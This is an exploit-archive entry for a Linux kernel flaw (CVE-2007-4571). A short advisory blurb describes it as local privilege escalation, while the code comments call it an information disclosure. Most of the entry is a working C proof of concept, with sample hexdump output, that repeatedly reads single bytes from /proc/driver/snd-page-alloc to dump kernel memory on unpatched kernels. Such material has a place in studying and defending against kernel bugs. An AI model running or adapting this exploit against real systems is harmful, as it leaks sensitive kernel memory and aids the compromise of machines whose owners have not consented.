source: http://www.securityfocus.com/bid/25774/info
 
The Linux kernel is prone to a local privilege-escalation vulnerability.
 
Exploiting this issue may allow local attackers to gain elevated privileges, facilitating the complete compromise of affected computers.
 
Versions of Linux kernel prior to 2.4.35.3 and 2.6.22.7 are vulnerable to this issue. 

/*
 *****************************************************************************************
 * by Karimo_DM under GPL                                                                *
 *                                                                                       *
 * Linux Kernel ALSA snd-page-alloc Local Proc File Information Disclosure Vulnerability *
 * CVE-2007-4571                                                                         *
 *                                                                                       *
 * This simple PoF demonstrate how snd_page_alloc.c prior to Linux Kernel version        * 
 * 2.6.22.8 (2.6.23-rc8) fails to boundary check a buffer in case of count=1 showing     *
 * parts of kernel memory (reaveling randomly some risky informations).               	 *
 *                                                                                       *
 * karimo@localhost:~/src/c/bugs$ gcc -O2 cve20074571_alsa.c -ocve20074571_alsa          *
 * karimo@localhost:~/src/c/bugs$ ./cve20074571_alsa | hexdump -C                        *
 * 00000000  00 03 55 55 27 00 00 00  10 50 12 08 1e 50 12 08  |..UU'....P...P..|        *
 * 00000010  4f 53 46 30 30 30 31 30  30 32 30 2f 2f 00 41 4e  |OSF00010020//.AN|        *
 * 00000020  53 49 5f 58 33 2e 34 2d  31 39 00 03 55 55 27 00  |SI_X3.4-19..UU'.|        *
 * 00000030  00 00 10 50 12 08 1e 50  12 08 4f 53 46 30 30 30  |...P...P..OSF000|        *
 * 00000040  31 30 30 32 30 2f 2f 00  41 4e 53 49 5f 58 33 2e  |10020//.ANSI_X3.|        *
 * 00000050  34 2d 31 39 00 03 55 55  27 00 00 00 10 50 12 08  |4-19..UU'....P..|        *
 * 00000060  1e 50 12 08 4f 53 46 30  30 30 31 30 30 32 30 2f  |.P..OSF00010020/|        *
 * 00000070  2f 00 41 4e 53 49 5f 58  33 2e 34 2d 31 39 00 03  |/.ANSI_X3.4-19..|        *
 * 00000080  55 55 27 00 00 00 10 50  12 08 1e 50 12 08 4f 53  |UU'....P...P..OS|        *
 * 00000090  46 30 30 30 31 30 30 32  30 2f 2f 00 41 4e 53 49  |F00010020//.ANSI|        *
 * ...                                                                                   *
 * 000051d0  00 02 20 00 78 ce ed da  c0 43 93 c4 01 80 00 4d  |.. .x����C.�...M|        *
 * 000051e0  71 88 9d 3c 04 27 0d 5d  80 ec 19 2f 12 8a 42 9d  |q..<.'.].�./..B.|        *
 * 000051f0  80 2e 9f c7 89 2c 87 ca  97 dd 50 8a e3 fa c3 15  |...�.,.�.�P.���.|        *
 * 00005200  a2 3e 37 49 93 c4 01 80  00 4d 71 88 9d 3c 04 27  |�>7I.�...Mq..<.'|        *
 * 00005210  0d 5d 80 ec 19 2f 12 8a  42 9d 80 2e 9f c7 89 2c  |.].�./..B....�.,|        *
 * 00005220  87 ca 97 dd 50 8a e3 fa  c3 15 a2 3e 37 49 93 c4  |.�.�P.���.�>7I.�|        *
 * ...                                                                                   *
 *                                                                                       *
 *                                                                                       *
 * [ Tested on a Slackware 12.0 running a self-compiled 2.6.21.3 Linux Kernel ]          *
 *****************************************************************************************
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>

#define _SOME_NUM 0xffff

int main() {
  unsigned int j;
  char kern_mem[2];
  int fd=open("/proc/driver/snd-page-alloc",O_RDONLY);
  for (j=0;j<(unsigned int)_SOME_NUM;j++) {
    memset(kern_mem,0,2);
    /* That 1 really do the job ;P */
    if (!read(fd,kern_mem,1)) {
      close(fd);
      fd=open("/proc/driver/snd-page-alloc",O_RDONLY);
    } else printf("%c",kern_mem[0]);
  }
}
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                